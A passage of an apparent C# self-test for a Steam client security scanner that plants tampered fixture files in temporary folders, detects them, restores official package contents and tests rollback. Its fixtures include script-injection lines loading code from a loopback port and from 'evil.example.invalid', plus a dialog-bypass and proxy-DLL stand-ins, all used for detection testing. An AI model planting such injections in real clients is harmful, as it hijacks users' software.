using System.IO;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Win32.SafeHandles;
using SteamSentinel.Broker;
using SteamSentinel.Core.Inspection;
using SteamSentinel.Core.Models;
using SteamSentinel.Core.Remediation;
using SteamSentinel.Core.Reporting;
using SteamSentinel.Core.Rules;
using SteamSentinel.Core.Scanning;
using SteamSentinel.Core.Steam;
using SteamSentinel.Core.Utilities;

namespace SteamSentinel.SelfTest;

internal static partial class Program
{
    /// <summary>
    /// 端到端验证 Core 扫描确权、PackageRestore 计划构建（含离线与 mock CDN 补拉）、Broker 进程安全自动关停、
    /// 零信任独立解包不等长原位修复、复验及防覆盖回滚闭环（全隔离夹具，绝不触碰宿主机真机 Steam）。
    /// </summary>
    internal static async Task TestSteamFullRecoveryBrokerAsync(string root)
    {
        string work = Path.Combine(root, "steam-full-recovery-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(work);

        try
        {
            RuleSet rules = RuleLoader.LoadActive().Rules;
            await VerifyFullPackageRecoveryAndRollbackAsync(work, rules);
            await VerifyClientBinaryMissingAndNonRestorableCasesAsync(work, rules);
            await VerifyBrokerZeroTrustPackageRejectionAsync(work, rules);
        }
        finally
        {
            try
            {
                if (Directory.Exists(work))
                    Directory.Delete(work, recursive: true);
            }
            catch
            {
                // 临时测试目录清理失败不影响断言结论。
            }
        }
    }

    private static async Task VerifyFullPackageRecoveryAndRollbackAsync(string work, RuleSet rules)
    {
        string steamRoot = Path.Combine(work, "SteamFixture");
        string otherSteamRoot = Path.Combine(work, "OtherSteamFixture");
        string quarantineRoot = Path.Combine(work, "QuarantineRoot");
        Directory.CreateDirectory(Path.Combine(steamRoot, "package"));
        Directory.CreateDirectory(Path.Combine(steamRoot, "steamui"));
        Directory.CreateDirectory(Path.Combine(steamRoot, "clientui"));
        Directory.CreateDirectory(Path.Combine(steamRoot, "resource"));
        Directory.CreateDirectory(Path.Combine(steamRoot, "bin", "cef", "cef.win7x64"));
        Directory.CreateDirectory(Path.Combine(steamRoot, "win64"));
        Directory.CreateDirectory(Path.Combine(steamRoot, "millennium"));
        Directory.CreateDirectory(otherSteamRoot);
        Directory.CreateDirectory(quarantineRoot);

        // 1. 构造正版官方文件载荷（故意设计与篡改文件不等长：sp.js 更短测截断；chunk~1.js 与 webkit.css 更长测扩容）
        byte[] officialSpJs = "console.log('official clean sp');\n"u8.ToArray();
        byte[] officialChunkJs = Encoding.UTF8.GetBytes(
            "// official steamui chunk~1 module header\n" +
            new string(' ', 180) +
            "\nconsole.log('official chunk ok');\n");
        byte[] officialExtJs = "console.log('official clean ext');\n"u8.ToArray();
        byte[] officialWebkitCss = Encoding.UTF8.GetBytes(
            "/* official clean Steam webkit.css */\n" +
            new string(' ', 160) +
            "\n.URLBar { display: flex; }\n");

        byte[] officialSteamExe = new byte[256];
        "MZ_OFFICIAL_STEAM_CLEAN_EXE"u8.CopyTo(officialSteamExe);

        byte[] steamUiZip = CreateZipBytes(
            ("steamui/sp.js", officialSpJs),
            ("steamui/chunk~1.js", officialChunkJs),
            ("steamui/ext.js", officialExtJs));
        byte[] steamUiVz = CreateVzBytes(steamUiZip);
        string steamUiZipSha = Hashing.Sha256Bytes(steamUiZip);
        string steamUiVzSha = Hashing.Sha256Bytes(steamUiVz);

        byte[] resourceZip = CreateZipBytes(("resource/webkit.css", officialWebkitCss));
        string resourceZipSha = Hashing.Sha256Bytes(resourceZip);

        byte[] steamExeZip = CreateZipBytes(("steam.exe", officialSteamExe));
        byte[] steamExeVz = CreateVzBytes(steamExeZip);
        string steamExeZipSha = Hashing.Sha256Bytes(steamExeZip);
        string steamExeVzSha = Hashing.Sha256Bytes(steamExeVz);

        const string steamUiZipName = "steamui_websrc_all.zip.1111111111111111111111111111111111111111";
        const string steamUiVzName = "steamui_websrc_all.zip.vz.2222222222222222222222222222222222222222_123";
        const string resourceZipName = "resources_all.zip.3333333333333333333333333333333333333333";
        const string steamRowZipName = "steam_win64_steamrow.zip.4444444444444444444444444444444444444444";
        const string steamRowVzName = "steam_win64_steamrow.zip.vz.5555555555555555555555555555555555555555_123";

        string manifestText =
            $$"""
            "win64"
            {
                "version"        "1794536299"
                "ostype"        "win10"
                "steamui_websrc_all"
                {
                    "file"        "{{steamUiZipName}}"
                    "size"        "{{steamUiZip.Length}}"
                    "sha2"        "{{steamUiZipSha}}"
                    "zipvz"        "{{steamUiVzName}}"
                    "sha2vz"        "{{steamUiVzSha}}"
                }
                "resources_all"
                {
                    "file"        "{{resourceZipName}}"
                    "size"        "{{resourceZip.Length}}"
                    "sha2"        "{{resourceZipSha}}"
                }
                "steam_win64"
                {
                    "steamrow"
                    {
                        "file"        "{{steamRowZipName}}"
                        "size"        "{{steamExeZip.Length}}"
                        "sha2"        "{{steamExeZipSha}}"
                        "zipvz"        "{{steamRowVzName}}"
                        "sha2vz"        "{{steamExeVzSha}}"
                        "IsBootstrapperPackage"        "1"
                    }
                    "file"        "{{steamRowZipName}}"
                    "size"        "{{steamExeZip.Length}}"
                    "sha2"        "{{steamExeZipSha}}"
                    "zipvz"        "{{steamRowVzName}}"
                    "sha2vz"        "{{steamExeVzSha}}"
                    "IsBootstrapperPackage"        "1"
                    "IsBootStrapper"        "1"
                }
            }
            """;

        string pkgDir = Path.Combine(steamRoot, "package");
        await File.WriteAllTextAsync(
            Path.Combine(pkgDir, "steam_client_win64.manifest"),
            manifestText.Replace("    ", "\t", StringComparison.Ordinal),
            new UTF8Encoding(false));

        string installedBodyLf =
            $"steam.exe,{officialSteamExe.Length};1794536299;{SteamPackageArchive.ComputeCrc32(officialSteamExe)}\n" +
            $"steamui\\sp.js,{officialSpJs.Length};1794536299;{SteamPackageArchive.ComputeCrc32(officialSpJs)}\n" +
            $"steamui\\chunk~1.js,{officialChunkJs.Length};1794536299;{SteamPackageArchive.ComputeCrc32(officialChunkJs)}\n" +
            $"steamui\\ext.js,{officialExtJs.Length};1794536299;{SteamPackageArchive.ComputeCrc32(officialExtJs)}\n" +
            $"resource\\webkit.css,{officialWebkitCss.Length};1794536299;{SteamPackageArchive.ComputeCrc32(officialWebkitCss)}\n" +
            "OSVER=20\nVERSION=3\n";
        string installedSha1 = Convert.ToHexString(SHA1.HashData(Encoding.UTF8.GetBytes(installedBodyLf)));
        await File.WriteAllTextAsync(
            Path.Combine(pkgDir, "steam_client_win64.installed"),
            (installedBodyLf + $"SHA1={installedSha1}\n").Replace("\n", "\r\n", StringComparison.Ordinal),
            new UTF8Encoding(false));

        // 仅预先在本地放置 steamui .zip.vz 与 resources .zip；steam_win64_steamrow .zip.vz 故意留空以验证按需 CDN 补拉
        await File.WriteAllBytesAsync(Path.Combine(pkgDir, steamUiVzName), steamUiVz);
        await File.WriteAllBytesAsync(Path.Combine(pkgDir, resourceZipName), resourceZip);

        // 2. 写入篡改后的 UI 脚本、隐藏样式 CSS、未签名劫持 DLL 及篡改版 steam.exe
        string spPath = Path.Combine(steamRoot, "steamui", "sp.js");
        string chunkPath = Path.Combine(steamRoot, "steamui", "chunk~1.js");
        string extPath = Path.Combine(steamRoot, "steamui", "ext.js");
        string webkitPath = Path.Combine(steamRoot, "resource", "webkit.css");
        string steamExePath = Path.Combine(steamRoot, "steam.exe");
        string cefProxyPath = Path.Combine(steamRoot, "bin", "cef", "cef.win7x64", "version.dll");
        string win64ForwarderPath = Path.Combine(steamRoot, "win64", "versionOrg.dll");
        string win64PairedVersionPath = Path.Combine(steamRoot, "win64", "version.dll");
        string millenniumWsockPath = Path.Combine(steamRoot, "wsock32.dll");

        byte[] tamperedSpJs = "function BMustShowSupportAlertDialog(){return false;} // longer tampered sp.js banner bypass\n"u8.ToArray();
        byte[] tamperedChunkJs = "const s=document.createElement('script');s.src='http://127.0.0.1:43210/inject.js';document.head.appendChild(s);"u8.ToArray();
        byte[] tamperedExtJs = "const e=document.createElement('script');e.src='https://evil.example.invalid/hook.js';document.head.appendChild(e);"u8.ToArray();
        byte[] tamperedWebkitCss = ".URLBar { display: none !important; }"u8.ToArray();
        byte[] tamperedSteamExe = new byte[128];
        "MZ_TAMPERED_UNSIGNED_EXE"u8.CopyTo(tamperedSteamExe);

        await File.WriteAllBytesAsync(spPath, tamperedSpJs);
        await File.WriteAllBytesAsync(chunkPath, tamperedChunkJs);
        await File.WriteAllBytesAsync(extPath, tamperedExtJs);
        await File.WriteAllBytesAsync(webkitPath, tamperedWebkitCss);
        await File.WriteAllBytesAsync(steamExePath, tamperedSteamExe);
        await File.WriteAllBytesAsync(cefProxyPath, "MZ_UNSIGNED_CEF_PROXY"u8.ToArray());
        await File.WriteAllBytesAsync(win64ForwarderPath, "MZ_UNSIGNED_FORWARDER"u8.ToArray());
        await File.WriteAllBytesAsync(win64PairedVersionPath, "MZ_UNSIGNED_VERSION_SHIM"u8.ToArray());
        await File.WriteAllBytesAsync(millenniumWsockPath, "MZ_MILLENNIUM_WSOCK32"u8.ToArray());

        Check("全链路夹具预先满足不等长替换前提",
            tamperedSpJs.Length > officialSpJs.Length &&
            tamperedChunkJs.Length < officialChunkJs.Length &&
            tamperedWebkitCss.Length < officialWebkitCss.Length &&
            tamperedSteamExe.Length < officialSteamExe.Length);

        // 自定义签名检验桩：仅当 PE 字节头匹配官方干净夹具时判定为 Valve 官方签名
        SignatureResult VerifyFixtureSignature(string filePath, SafeFileHandle? handle)
        {
            byte[] bytes = File.ReadAllBytes(filePath);
            if (bytes.Length == officialSteamExe.Length && bytes.AsSpan().SequenceEqual(officialSteamExe))
                return new SignatureResult(SignatureStatus.Valid, "Valid Valve fixture signature")
                {
                    SignerSubject = "CN=Valve, O=Valve, L=Bellevue, S=Washington, C=US",
                    IsValveSigner = true
                };
            return new SignatureResult(SignatureStatus.Unsigned, "Unsigned fixture PE");
        }

        // 3. 扫描并校验全部规则确权升级（单信号语义篡改、loopback、external、CSS 隐藏、steam.exe、代理 DLL 与 millennium 保留）
        SteamLayout layout = new();
        layout.SteamRoots.Add(steamRoot);

        SteamSecurityScanner scanner = new(rules, VerifyFixtureSignature);
        ScanReport report = new();
        await scanner.ScanAsync(layout, report);

        Finding? spFinding = report.Findings.FirstOrDefault(f => f.RuleId == "STEAM-UI-SEMANTIC-TAMPERING" && f.Target.Equals(spPath, StringComparison.OrdinalIgnoreCase));
        Finding? chunkFinding = report.Findings.FirstOrDefault(f => f.RuleId == "STEAM-UI-LOOPBACK-SCRIPT" && f.Target.Equals(chunkPath, StringComparison.OrdinalIgnoreCase));
        Finding? extFinding = report.Findings.FirstOrDefault(f => f.RuleId == "STEAM-UI-EXTERNAL-SCRIPT" && f.Target.Equals(extPath, StringComparison.OrdinalIgnoreCase));
        Finding? cssFinding = report.Findings.FirstOrDefault(f => f.RuleId == "STEAM-UI-CSS-SUPPRESSION" && f.Target.Equals(webkitPath, StringComparison.OrdinalIgnoreCase));
        Finding? exeFinding = report.Findings.FirstOrDefault(f => f.RuleId == "STEAM-CLIENT-BINARY-TAMPERED" && f.Target.Equals(steamExePath, StringComparison.OrdinalIgnoreCase));
        Finding? cefProxyFinding = report.Findings.FirstOrDefault(f => f.RuleId == "STEAM-PROXY-DLL-PRESENT" && f.Target.Equals(cefProxyPath, StringComparison.OrdinalIgnoreCase));
        Finding? forwarderFinding = report.Findings.FirstOrDefault(f => f.RuleId == "STEAM-DLL-VERSION-FORWARDER" && f.Target.Equals(win64ForwarderPath, StringComparison.OrdinalIgnoreCase));
        Finding? duplicateVersionFinding = report.Findings.FirstOrDefault(f => f.RuleId == "STEAM-PROXY-DLL-PRESENT" && f.Target.Equals(win64PairedVersionPath, StringComparison.OrdinalIgnoreCase));
        Finding? wsockFinding = report.Findings.FirstOrDefault(f => f.RuleId == "STEAM-PROXY-DLL-PRESENT" && f.Target.Equals(millenniumWsockPath, StringComparison.OrdinalIgnoreCase));

        Check("全链路扫描将官方偏离 UI/CSS/steam.exe 确权为可 PackageRestore 处置且不误伤 millennium wsock32",
            spFinding is { CanRemediate: true, ConfigurationKind: SteamConfigurationRepair.PackageRestore } &&
            spFinding.SuggestedActions.SequenceEqual([SuggestedActionKind.RepairSteamConfiguration]) &&
            chunkFinding is { CanRemediate: true, ConfigurationKind: SteamConfigurationRepair.PackageRestore } &&
            chunkFinding.SuggestedActions.SequenceEqual([SuggestedActionKind.RepairSteamConfiguration]) &&
            extFinding is { CanRemediate: true, ConfigurationKind: SteamConfigurationRepair.PackageRestore } &&
            extFinding.SuggestedActions.SequenceEqual([SuggestedActionKind.RepairSteamConfiguration]) &&
            cssFinding is { CanRemediate: true, ConfigurationKind: SteamConfigurationRepair.PackageRestore } &&
            cssFinding.SuggestedActions.SequenceEqual([SuggestedActionKind.RepairSteamConfiguration]) &&
            exeFinding is { CanRemediate: true, ConfigurationKind: SteamConfigurationRepair.PackageRestore } &&
            exeFinding.SuggestedActions.SequenceEqual([SuggestedActionKind.RepairSteamConfiguration]) &&
            cefProxyFinding is { CanRemediate: true } &&
            cefProxyFinding.SuggestedActions.SequenceEqual([SuggestedActionKind.QuarantineFile]) &&
            forwarderFinding is { CanRemediate: true } &&
            forwarderFinding.SuggestedActions.SequenceEqual([SuggestedActionKind.QuarantineFile]) &&
            duplicateVersionFinding is null &&
            wsockFinding is { CanRemediate: false } &&
            wsockFinding.SuggestedActions.SequenceEqual([SuggestedActionKind.ReviewOnly]));

        // 4. 离线禁止补拉场景必须精准失败，开启按需 mock CDN 后成功补拉并构建完整处置计划
        RemediationPlanBuilder offlineBuilder = new(rules, layout, allowPackageDownload: false, verifyExecutableSignature: VerifyFixtureSignature);
        bool offlineExeRejected = false;
        try
        {
            _ = await offlineBuilder.BuildAsync([exeFinding!], addKnownDomainBlock: false);
        }
        catch (Exception ex) when (ex is InvalidDataException or InvalidOperationException)
        {
            offlineExeRejected = true;
        }
        Check("全链路离线关闭下载且本地无 steamrow 分包时拒绝生成 PackageRestore 计划", offlineExeRejected);

        int cdnFetchCount = 0;
        using RecoveryMockCdnHandler cdnHandler = new(request =>
        {
            if (request.RequestUri?.AbsolutePath.EndsWith("/" + steamRowVzName, StringComparison.OrdinalIgnoreCase) == true)
            {
                Interlocked.Increment(ref cdnFetchCount);
                return new HttpResponseMessage(HttpStatusCode.OK)
                {
                    RequestMessage = request,
                    Content = new ByteArrayContent(steamExeVz)
                };
            }
            return new HttpResponseMessage(HttpStatusCode.NotFound) { RequestMessage = request };
        });

        RemediationPlanBuilder onlineBuilder = new(
            rules,
            layout,
            allowPackageDownload: true,
            packageHttpMessageHandler: cdnHandler,
            verifyExecutableSignature: VerifyFixtureSignature);

        Finding[] actionableFindings = [spFinding!, chunkFinding!, extFinding!, cssFinding!, exeFinding!, cefProxyFinding!, forwarderFinding!];
        RemediationPlan plan = await onlineBuilder.BuildAsync(actionableFindings, addKnownDomainBlock: false, allFindings: report.Findings);

        string downloadedRowVzPath = Path.Combine(pkgDir, steamRowVzName);
        Check("全链路按需 CDN 成功补拉 steamrow .zip.vz 并生成无防火墙冗余的完整修复计划",
            cdnFetchCount == 1 &&
            File.Exists(downloadedRowVzPath) &&
            plan.Actions.Count(a => a.Type == RemediationActionType.RepairSteamConfiguration && a.ConfigurationKind == SteamConfigurationRepair.PackageRestore) == 5 &&
            plan.Actions.Count(a => a.Type == RemediationActionType.QuarantineFile) == 2 &&
            plan.Actions.All(a => a.Type != RemediationActionType.AddProgramFirewallBlock));

        // 5. Broker 端准备模拟进程控制器（绝不触碰宿主机真机 Steam），先验证 ValidateBeforeExecution 保持纯只读
        RecoveryMockSteamProcessEnvironment procEnv = new()
        {
            VerifyFunc = path => path.Equals(steamExePath, StringComparison.OrdinalIgnoreCase)
                ? new SignatureResult(SignatureStatus.Valid, "Valve") { IsValveSigner = true, SignerSubject = "CN=Valve" }
                : new SignatureResult(SignatureStatus.Unsigned, "Unsigned")
        };
        procEnv.ShutdownAction = _ =>
        {
            procEnv.PollsRemainingBeforeExit = 1;
            return true;
        };
        string unrelatedSteamExe = Path.Combine(otherSteamRoot, "steam.exe");
        procEnv.RunningProcesses.AddRange(
        [
            new(5101, "steam", steamExePath),
            new(5102, "steamwebhelper", Path.Combine(steamRoot, "bin", "cef", "cef.win7x64", "steamwebhelper.exe")),
            new(5201, "steam", unrelatedSteamExe)
        ]);

        SteamProcessController processController = new(procEnv);
        RecoveryMemoryTrustStore trustStore = new();
        RecoveryFixtureStateSecurity stateSecurity = new();
        BrokerEngine broker = new(trustStore, stateSecurity, processController, layout, VerifyFixtureSignature, quarantineRoot);

        // ValidateBeforeExecution 在目标 Steam 仍运行时必须保持纯只读不抛错、不触发关停、不创建隔离目录
        broker.ValidateBeforeExecution(plan);
        Check("Broker ValidateBeforeExecution 在模拟 Steam 运行时保持纯只读且不触发关停",
            procEnv.ShutdownCalls.Count == 0 &&
            procEnv.TerminateCalls.Count == 0 &&
            Directory.GetDirectories(quarantineRoot).Length == 0);

        // 6. Broker 执行零信任独立解包不等长原位修复 + 隔离非官方代理 DLL
        RemediationRunResult runResult = await broker.ExecuteAsync(plan);
        bool allVerified = true;
        foreach (RemediationAction action in plan.Actions.Where(a => a.Type == RemediationActionType.RepairSteamConfiguration))
        {
            if (!await SteamConfigurationRepairTarget.IsRepairedAsync(action, layout))
            {
                allVerified = false;
                break;
            }
        }

        Check("Broker 自动关停目标 Steam 后独立解包不等长原位修复全部文件并清理代理 DLL",
            runResult.Success &&
            procEnv.ShutdownCalls.Count >= 1 &&
            procEnv.ShutdownCalls.All(p => p.Equals(steamExePath, StringComparison.OrdinalIgnoreCase)) &&
            procEnv.RunningProcesses.Any(p => p.Pid == 5201) &&
            allVerified &&
            (await File.ReadAllBytesAsync(spPath)).SequenceEqual(officialSpJs) &&
            (await File.ReadAllBytesAsync(chunkPath)).SequenceEqual(officialChunkJs) &&
            (await File.ReadAllBytesAsync(extPath)).SequenceEqual(officialExtJs) &&
            (await File.ReadAllBytesAsync(webkitPath)).SequenceEqual(officialWebkitCss) &&
            (await File.ReadAllBytesAsync(steamExePath)).SequenceEqual(officialSteamExe) &&
            !File.Exists(cefProxyPath) &&
            !File.Exists(win64ForwarderPath));

        // 7. 二次复扫：UI/CSS/主程序/forwarder/CEF代理全部清零；原被 versionOrg.dll 折叠合并的孤立 win64\version.dll 正常按独立代理项暴露待清理
        ScanReport rescanReport = new();
        await scanner.ScanAsync(layout, rescanReport);
        Finding? leftoverVersionDll = rescanReport.Findings.FirstOrDefault(f =>
            f.RuleId == "STEAM-PROXY-DLL-PRESENT" && f.Target.Equals(win64PairedVersionPath, StringComparison.OrdinalIgnoreCase));
        Check("修复完成后复扫零 UI/CSS/steam.exe/forwarder/CEF 残留，仅剩独立 version.dll 与 millennium",
            leftoverVersionDll is { CanRemediate: true } &&
            rescanReport.Findings.Where(f => f != leftoverVersionDll).All(f => !f.CanRemediate) &&
            !rescanReport.Findings.Any(f => f.RuleId is "STEAM-UI-SEMANTIC-TAMPERING" or "STEAM-UI-LOOPBACK-SCRIPT" or
                "STEAM-UI-EXTERNAL-SCRIPT" or "STEAM-UI-CSS-SUPPRESSION" or "STEAM-CLIENT-BINARY-TAMPERED" or
                "STEAM-CLIENT-BINARY-MISSING" or "STEAM-DLL-VERSION-FORWARDER"));

        // 8. 回滚前模拟目标 Steam 再次启动：Broker 自动安全退出后将文件原长度/原内容与被隔离文件完整还原
        procEnv.ResetCalls();
        procEnv.RunningProcesses.Add(new(5103, "steam", steamExePath));
        RemediationPlan rollbackPlan = new()
        {
            Actions =
            [
                new RemediationAction
                {
                    Type = RemediationActionType.RollbackIncident,
                    Target = runResult.IncidentId.ToString("D"),
                    IncidentId = runResult.IncidentId.ToString("D"),
                    DisplayName = "Rollback full package recovery"
                }
            ]
        };
        RemediationRunResult rollbackResult = await broker.ExecuteAsync(rollbackPlan);
        Check("Broker 回滚前自动退出模拟 Steam 并精确还原被替换文件原始长度与代理 DLL",
            rollbackResult.Success &&
            procEnv.ShutdownCalls.Count >= 1 &&
            (await File.ReadAllBytesAsync(spPath)).SequenceEqual(tamperedSpJs) &&
            (await File.ReadAllBytesAsync(chunkPath)).SequenceEqual(tamperedChunkJs) &&
            (await File.ReadAllBytesAsync(extPath)).SequenceEqual(tamperedExtJs) &&
            (await File.ReadAllBytesAsync(webkitPath)).SequenceEqual(tamperedWebkitCss) &&
            (await File.ReadAllBytesAsync(steamExePath)).SequenceEqual(tamperedSteamExe) &&
            File.Exists(cefProxyPath) &&
            File.Exists(win64ForwarderPath));

        // 9. 再次修复 sp.js 后模拟第三方/官方更新覆盖，回滚必须拒绝覆写新版文件
        ScanReport singleRescan = new();
        await scanner.ScanAsync(layout, singleRescan);
        Finding singleSpFinding = singleRescan.Findings.Single(f =>
            f.RuleId == "STEAM-UI-SEMANTIC-TAMPERING" && f.Target.Equals(spPath, StringComparison.OrdinalIgnoreCase));
        RemediationPlan singlePlan = await onlineBuilder.BuildAsync([singleSpFinding], addKnownDomainBlock: false);
        RemediationRunResult singleRun = await broker.ExecuteAsync(singlePlan);
        byte[] thirdPartyUpdatedSpJs = "console.log('newer Steam client update v2');\n"u8.ToArray();
        await File.WriteAllBytesAsync(spPath, thirdPartyUpdatedSpJs);

        RemediationPlan blockedRollbackPlan = new()
        {
            Actions =
            [
                new RemediationAction
                {
                    Type = RemediationActionType.RollbackIncident,
                    Target = singleRun.IncidentId.ToString("D"),
                    IncidentId = singleRun.IncidentId.ToString("D"),
                    DisplayName = "Rollback blocked by newer file"
                }
            ]
        };
        RemediationRunResult blockedRollback = await broker.ExecuteAsync(blockedRollbackPlan);
        Check("PackageRestore 回滚检测到文件已被官方或第三方更新时拒绝覆盖新版内容",
            !blockedRollback.Success &&
            (await File.ReadAllBytesAsync(spPath)).SequenceEqual(thirdPartyUpdatedSpJs));
    }

    private static async Task VerifyClientBinaryMissingAndNonRestorableCasesAsync(string work, RuleSet rules)
    {
        // A. 清单存在且缺失 steam.exe -> STEAM-CLIENT-BINARY-MISSING（ReviewOnly / 引导官方安装器）
        string missingExeRoot = Path.Combine(work, "SteamMissingExe");
        Directory.CreateDirectory(Path.Combine(missingExeRoot, "package"));
        string dummySha = new('B', 64);
        string emptyManifest =
            $$"""
            "win64"
            {
                "version"        "1794536300"
                "resources_all"
                {
                    "file"        "resources_all.zip.0001"
                    "size"        "100"
                    "sha2"        "{{dummySha}}"
                }
            }
            """;
        await File.WriteAllTextAsync(
            Path.Combine(missingExeRoot, "package", "steam_client_win64.manifest"),
            emptyManifest.Replace("    ", "\t", StringComparison.Ordinal),
            new UTF8Encoding(false));

        SteamLayout missingLayout = new();
        missingLayout.SteamRoots.Add(missingExeRoot);
        SteamSecurityScanner scanner = new(rules);
        ScanReport missingReport = new();
        await scanner.ScanAsync(missingLayout, missingReport);

        Finding? missingFinding = missingReport.Findings.FirstOrDefault(f => f.RuleId == "STEAM-CLIENT-BINARY-MISSING");
        Check("缺失 steam.exe 且含清单时上报 STEAM-CLIENT-BINARY-MISSING 并引导官方安装器兜底",
            missingFinding is { CanRemediate: false } &&
            missingFinding.SuggestedActions.SequenceEqual([SuggestedActionKind.ReviewOnly]));

        // B. 清单无 steam_win64 包且存在未签名 steam.exe -> STEAM-CLIENT-BINARY-TAMPERED 但 CanRemediate=false
        string noPkgExeRoot = Path.Combine(work, "SteamNoExePackage");
        Directory.CreateDirectory(Path.Combine(noPkgExeRoot, "package"));
        await File.WriteAllTextAsync(
            Path.Combine(noPkgExeRoot, "package", "steam_client_win64.manifest"),
            emptyManifest.Replace("    ", "\t", StringComparison.Ordinal),
            new UTF8Encoding(false));
        await File.WriteAllBytesAsync(Path.Combine(noPkgExeRoot, "steam.exe"), "MZ_UNSIGNED_STUB"u8.ToArray());

        SteamLayout noPkgLayout = new();
        noPkgLayout.SteamRoots.Add(noPkgExeRoot);
        ScanReport noPkgReport = new();
        await scanner.ScanAsync(noPkgLayout, noPkgReport);

        Finding? nonRestorableExe = noPkgReport.Findings.FirstOrDefault(f => f.RuleId == "STEAM-CLIENT-BINARY-TAMPERED");
        Check("篡改 steam.exe 且清单无法覆盖主程序包时降级为 ReviewOnly 引导官方安装器",
            nonRestorableExe is { CanRemediate: false, ConfigurationKind: null } &&
            nonRestorableExe.SuggestedActions.SequenceEqual([SuggestedActionKind.ReviewOnly]));
    }

    private static async Task VerifyBrokerZeroTrustPackageRejectionAsync(string work, RuleSet rules)
    {
        string ztRoot = Path.Combine(work, "ZeroTrustFixture");
        string pkgDir = Path.Combine(ztRoot, "package");
        string steamUiDir = Path.Combine(ztRoot, "steamui");
        string backupDir = Path.Combine(work, "zt-backup");
        Directory.CreateDirectory(pkgDir);
        Directory.CreateDirectory(steamUiDir);
        Directory.CreateDirectory(backupDir);

        byte[] cleanSp = "console.log('clean');\n"u8.ToArray();
        byte[] cleanExe = new byte[128];
        "MZ_UNSIGNED_EXE_FOR_OFFLINE_VERIFY"u8.CopyTo(cleanExe);

        byte[] uiZip = CreateZipBytes(("steamui/sp.js", cleanSp));
        byte[] uiVz = CreateVzBytes(uiZip);
        byte[] exeZip = CreateZipBytes(("steam.exe", cleanExe));
        byte[] exeVz = CreateVzBytes(exeZip);

        const string uiZipName = "steamui_websrc_all.zip.aaaaaaaa";
        const string uiVzName = "steamui_websrc_all.zip.vz.bbbbbbbb_1";
        const string exeZipName = "steam_win64.zip.cccccccc";
        const string exeVzName = "steam_win64.zip.vz.dddddddd_1";

        string manifest =
            $$"""
            "win64"
            {
                "version"        "1794536301"
                "steamui_websrc_all"
                {
                    "file"        "{{uiZipName}}"
                    "size"        "{{uiZip.Length}}"
                    "sha2"        "{{Hashing.Sha256Bytes(uiZip)}}"
                    "zipvz"        "{{uiVzName}}"
                    "sha2vz"        "{{Hashing.Sha256Bytes(uiVz)}}"
                }
                "steam_win64"
                {
                    "file"        "{{exeZipName}}"
                    "size"        "{{exeZip.Length}}"
                    "sha2"        "{{Hashing.Sha256Bytes(exeZip)}}"
                    "zipvz"        "{{exeVzName}}"
                    "sha2vz"        "{{Hashing.Sha256Bytes(exeVz)}}"
                    "IsBootstrapperPackage"        "1"
                }
            }
            """;

        await File.WriteAllTextAsync(
            Path.Combine(pkgDir, "steam_client_win64.manifest"),
            manifest.Replace("    ", "\t", StringComparison.Ordinal),
            new UTF8Encoding(false));
        string installedBodyLf =
            $"steam.exe,{cleanExe.Length};1794536301;{SteamPackageArchive.ComputeCrc32(cleanExe)}\n" +
            $"steamui\\sp.js,{cleanSp.Length};1794536301;{SteamPackageArchive.ComputeCrc32(cleanSp)}\n" +
            "OSVER=20\nVERSION=3\n";
        string installedSha1 = Convert.ToHexString(SHA1.HashData(Encoding.UTF8.GetBytes(installedBodyLf)));
        await File.WriteAllTextAsync(
            Path.Combine(pkgDir, "steam_client_win64.installed"),
            (installedBodyLf + $"SHA1={installedSha1}\n").Replace("\n", "\r\n", StringComparison.Ordinal),
            new UTF8Encoding(false));
        await File.WriteAllBytesAsync(Path.Combine(pkgDir, uiVzName), uiVz);
        await File.WriteAllBytesAsync(Path.Combine(pkgDir, exeVzName), exeVz);

        string spPath = Path.Combine(steamUiDir, "sp.js");
        string exePath = Path.Combine(ztRoot, "steam.exe");
        byte[] tamperedSp = "function BMustShowSupportAlertDialog(){return false;}"u8.ToArray();
        byte[] tamperedExe = "MZ_TAMPERED_ZERO_TRUST"u8.ToArray();
        await File.WriteAllBytesAsync(spPath, tamperedSp);
        await File.WriteAllBytesAsync(exePath, tamperedExe);

        SteamLayout layout = new();
        layout.SteamRoots.Add(ztRoot);

        static SignatureResult AllowCleanExeInCaptureOnly(string filePath, SafeFileHandle? _) =>
            filePath.Contains("pkg-verify-", StringComparison.OrdinalIgnoreCase)
                ? new SignatureResult(SignatureStatus.Valid, "Valve stub") { IsValveSigner = true, SignerSubject = "CN=Valve" }
                : new SignatureResult(SignatureStatus.Unsigned, "Tampered target");

        SteamSecurityScanner scanner = new(rules, AllowCleanExeInCaptureOnly);
        ScanReport report = new();
        await scanner.ScanAsync(layout, report);

        Finding spFinding = report.Findings.Single(f => f.RuleId == "STEAM-UI-SEMANTIC-TAMPERING");
        Finding exeFinding = report.Findings.Single(f => f.RuleId == "STEAM-CLIENT-BINARY-TAMPERED");

        RemediationPlanBuilder builder = new(rules, layout, allowPackageDownload: false, verifyExecutableSignature: AllowCleanExeInCaptureOnly);
        RemediationPlan plan = await builder.BuildAsync([spFinding, exeFinding], addKnownDomainBlock: false);
        RemediationAction spAction = plan.Actions.Single(a => a.Target.Equals(spPath, StringComparison.OrdinalIgnoreCase));
        RemediationAction exeAction = plan.Actions.Single(a => a.Target.Equals(exePath, StringComparison.OrdinalIgnoreCase));

        // 1. 伪造 RepairedSha256（客户端篡改传参）必须被 Broker 拒绝
        string tamperedRepairedJson = JsonSerializer.Serialize(spAction, JsonFile.Options)
            .Replace(spAction.RepairedSha256!, new string('f', 64), StringComparison.OrdinalIgnoreCase);
        RemediationAction forgedHashAction = JsonSerializer.Deserialize<RemediationAction>(tamperedRepairedJson, JsonFile.Options)!;

        bool forgedHashRejected = await ThrowsBrokerConfigDeniedAsync(() =>
            BrokerEngine.RepairSteamPackageRestoreFileAsync(
                forgedHashAction,
                layout,
                Path.Combine(backupDir, "forged.original"),
                (_, _) => Task.CompletedTask,
                _ => { },
                CancellationToken.None));

        // 2. 分包文件中的 PE 无法通过真实 AuthenticodeVerifier.VerifyOffline（不传入测试签章桩）时，Broker 必须拒绝原位替换
        bool unsignedExtractedExeRejected = await ThrowsBrokerConfigDeniedAsync(() =>
            BrokerEngine.RepairSteamPackageRestoreFileAsync(
                exeAction,
                layout,
                Path.Combine(backupDir, "unsigned-exe.original"),
                (_, _) => Task.CompletedTask,
                _ => { },
                CancellationToken.None,
                verifyExecutableSignature: null));

